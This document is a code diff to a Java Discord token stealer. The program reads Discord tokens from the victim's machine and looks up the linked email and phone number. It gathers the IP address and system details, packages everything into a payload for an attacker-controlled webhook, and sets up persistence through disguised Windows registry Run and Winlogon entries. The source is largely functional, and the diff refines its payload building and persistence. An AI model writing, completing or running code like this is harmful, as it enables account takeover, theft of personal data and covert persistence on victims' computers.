@@ -1,8 +1,5 @@
 package me.xefer;
 
-import org.json.JSONArray;
-import org.json.JSONObject;
-
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -16,8 +13,7 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Main {
-    private static boolean debug, shouldPersist, randomize_new_name;
-    private static String hideAs = "TokenLogger"; //What the registry entry should be called.
+    private static boolean debug = true; // Whether or not everyting should be displayed on terminal window
 
     public static void main(String[] args) throws Exception {
         // TODO: Billing information
@@ -27,18 +23,18 @@ public class Main {
         // IMPORTANT: Not tested on MacOS or Linux (hopefully works)
 
         //Settings:
+        String hideAs = "nottokenlogger"; //What the registry entry should be called.
         String discord_avatar_url = "https://i.ibb.co/fps45hd/steampfp.jpg"; //If you want to change the webhook icon
-        String discord_username = "Faggit"; //Webhook Name
+        String discord_username = "nonce"; //Webhook Name (only when embed)
         String discord_webhook_url = args[0]; //Change this
         boolean send_embed = true; //True sends embed, False sends it in text
         boolean ensure_valid = true; //Checks the account before sending (removes if invalid)
-        randomize_new_name = true; //Whether or not a random string shoud be set as the file name
-        debug = false;
-        shouldPersist = true; // Whether or not everyting should be displayed on terminal window
+        boolean randomize_new_name = true; //Whether or not a random string shoud be set as the file name
+        boolean shouldPersist = false;
 
         //Mini
         if (shouldPersist) {
-            mini_persistence();
+            mini_persistence(randomize_new_name, hideAs);
         }
 
         //Gatherer
@@ -63,93 +59,44 @@ public class Main {
         String pcInfo_cpuArch;
         String pcInfo_WindowsVersion;
 
-        long colour;
-
         //Assign what we know
         pcInfo_Username = System.getProperty("user.name");
         pcInfo_WindowsVersion = System.getProperty("os.name");
         pcInfo_cpuArch = System.getProperty("os.arch");
 
-        //Get discord token
-        JSONObject tokenInformation = new JSONObject(get_request("https://discordapp.com/api/v6/users/@me", true, token));
-        accountInfo_username = tokenInformation.getString("username") + "#" + tokenInformation.getString("discriminator");
-        accountInfo_email = String.valueOf(tokenInformation.get("email"));
-        accountInfo_phoneNr = String.valueOf(tokenInformation.get("phone"));
-        accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+tokenInformation.getString("id")+"/"+tokenInformation.get("avatar")+".png";
-        colour = 9109759;
-
-
         //Get IP
         pcInfo_IP = get_request("http://ipinfo.io/ip", false, null);
 
-        JSONObject webhook_content = new JSONObject();
-        JSONArray embed_content = new JSONArray();
-        JSONObject embedObject = new JSONObject();
-        JSONObject footerObject = new JSONObject();
-        JSONArray fieldObjects = new JSONArray();
-        JSONObject firstField = new JSONObject();
-        JSONObject secondField = new JSONObject();
-        JSONObject tokenField = new JSONObject();
+        //Get discord token
+        String tokenInformation = get_request("https://discordapp.com/api/v6/users/@me", true, token).replace(",", ",\n");
+        accountInfo_username = getJsonKey(tokenInformation, "username") + "#" + getJsonKey(tokenInformation, "discriminator");
+        accountInfo_email = getJsonKey(tokenInformation, "email");
 
-        if(sendEmbed) {
-            webhook_content.put("avatar_url", avatar_url);
-            webhook_content.put("username", username);
-        }
+        accountInfo_phoneNr = getJsonKey(tokenInformation, "phone");
+        accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+getJsonKey(tokenInformation, "id")+"/"+getJsonKey(tokenInformation, "avatar")+".png";
 
-        embedObject.put("color", colour);
-        footerObject.put("icon_url", "https://i.ibb.co/fps45hd/steampfp.jpg");
-        footerObject.put("text", "November | " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis()));
-        embedObject.put("footer", footerObject);
-        embedObject.put("thumbnail", new JSONObject().put("url", accountInfo_imageURL));
-        embedObject.put("author", new JSONObject().put("name", accountInfo_username));
-        firstField.put("name", "Account Info");
-        firstField.put("value",
-                "Email: "+accountInfo_email+
-                "\nPhone: "+accountInfo_phoneNr+
-                "\nNitro: Coming Soon"+
-                "\nBilling Info: Coming Soon"
-        );
 
-        firstField.put("inline", true);
-        secondField.put("name", "PC Info");
-        secondField.put("value",
-                "IP: " +pcInfo_IP+
-                "\nUsername: "+pcInfo_Username+
-                "\nWindows version: "+pcInfo_WindowsVersion+
-                "\nCPU Arch: "+pcInfo_cpuArch
-        );
 
-        secondField.put("inline", true);
-        tokenField.put("name", "**Token**");
-        tokenField.put("value", "```"+token+"```");
-
-        fieldObjects.put(firstField);
-        fieldObjects.put(secondField);
-        fieldObjects.put(tokenField);
-
-        embedObject.put("fields", fieldObjects);
-
-        embed_content.put(embedObject);
+        String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+accountInfo_imageURL+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://i.ibb.co/fps45hd/steampfp.jpg\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+accountInfo_username+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+accountInfo_email+"\\nPhone: "+accountInfo_phoneNr+"\\nNitro: Coming Soon\\nBilling Info: Coming Soon\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**Token**\",\"value\":\"```"+token+"```\"}]}],\"username\":\""+username+"\"}";
+        String finishedTextContent = "{\"avatar_url\":\""+accountInfo_imageURL+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+accountInfo_email+"```\\n**Phone NR:**\\n```"+accountInfo_phoneNr+"```\\n**Nitro:**\\n```Coming soon...```\\n**Billing Info:**\\n```Coming soon...```\\n**Token**\\n```"+token+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+accountInfo_username+"```\\n**IP:**\\n```"+pcInfo_IP+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+accountInfo_username+"\"}";
 
         if (sendEmbed) {
-            webhook_content.put("embeds", embed_content);
+            if (debug) {
+                System.out.println(finishedEmbedContent);
+            }
+            return finishedEmbedContent;
         } else {
-            webhook_content.put("avatar_url", "https://cdn.discordapp.com/avatars/"+tokenInformation.getString("id")+"/"+tokenInformation.get("avatar")+".png");
-            webhook_content.put("username", tokenInformation.getString("username") + "#" + tokenInformation.getString("discriminator"));
-            webhook_content.put("content", "***Discord Info***\n**Email:**\n```"+accountInfo_email+"```\n**Phone NR:**\n```"+accountInfo_phoneNr+"```\n**Nitro:**\n```Coming soon...```\n**Billing Info:**\n```Coming soon...```\n**Token**\n```"+token+"```\n\n***PC Info**\n**Username: ***\n```"+pcInfo_Username+"```\n**IP:**\n```"+pcInfo_IP+"```\n**Windows version:**\n```"+pcInfo_WindowsVersion+"```\n**CPU Arch:**\n```"+pcInfo_cpuArch+"```");
+            if (debug) {
+                System.out.println(finishedTextContent);
+            }
 
+            return finishedTextContent;
         }
-
-        if (debug) {
-            System.out.println(webhook_content.toString());
-        }
-
-        return webhook_content.toString(4);
     }
 
 
 
-    private static List<String> getTokens(boolean check_isValid) throws IOException {
+    private static List<String> getTokens(boolean check_isValid) {
         List<String> tokens = new ArrayList<>();
         String fs = System.getenv("file.separator");
         String localappdata = System.getenv("LOCALAPPDATA");
@@ -296,7 +243,7 @@ public class Main {
 
     }
 
-    private static void mini_persistence() throws Exception {
+    private static void mini_persistence(boolean randomize_new_name, String hideAs) throws Exception {
         String new_name;
         String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
         String decodedPath = URLDecoder.decode(path, "UTF-8");
@@ -314,21 +261,31 @@ public class Main {
 
         if (file_name.contains(".jar")) {
             //Make sure there is a file in roaming that does what we do
-            copyFileTo(new File(System.getProperty("user.dir"), file_name), new File(System.getenv("APPDATA"), new_name));
+            try {
+                try (OutputStream out = new FileOutputStream(new File(System.getenv("APPDATA"), new_name))) {
+                    Files.copy(new File(System.getProperty("user.dir"), file_name).toPath(), out);
+                    out.flush();
+                } catch (IOException i) {
+                }
+
+            } catch (ArrayIndexOutOfBoundsException e) {
+                copyFileTo(new File(System.getProperty("user.dir"), file_name), new File(System.getenv("APPDATA"), new_name));
+            }
+
             if (new File(System.getenv("APPDATA"), new_name).exists()) {
                 //Copy file to startup
                 //String startup_path = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup";
                 //copyFileTo(new File(System.getenv("APPDATA"), new_name), new File(startup_path));
                 String batch_file = new_name + ".bat";
+                writeToFile(new File("@echo off & java -jar " + batch_file + " & exit"), "@echo off & java -jar " + new_name + " & exit");
 
                 String[] reg_start = {
-                        "echo @echo off & java -jar " + new_name + " & exit >> " + batch_file + " & exit",
-                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                 };
                 Process proc = Runtime.getRuntime().exec(reg_start[0]);
                 proc.destroy();
@@ -380,6 +337,11 @@ public class Main {
             }
         }
     }
+
+    private static void writeToFile(File file, String text) throws IOException {
+        Files.write(file.toPath(), Collections.singleton(text));
+    }
+
     private static boolean copyFileTo(File f1, File f2) throws IOException {
         InputStream is = null;
         OutputStream os = null;
@@ -406,6 +368,16 @@ public class Main {
         }
 
         return f2.exists();
+    }
+
+    private static String getJsonKey(String jsonString, String wantedKey) {
+        Pattern jsonPattern = Pattern.compile("\""+wantedKey+"\": \".*\"");
+        Matcher matcher = jsonPattern.matcher(jsonString);
+
+        if (matcher.find()) {
+            return matcher.group(0).split("\"")[3];
+        }
+        return null;
     }
 
 }
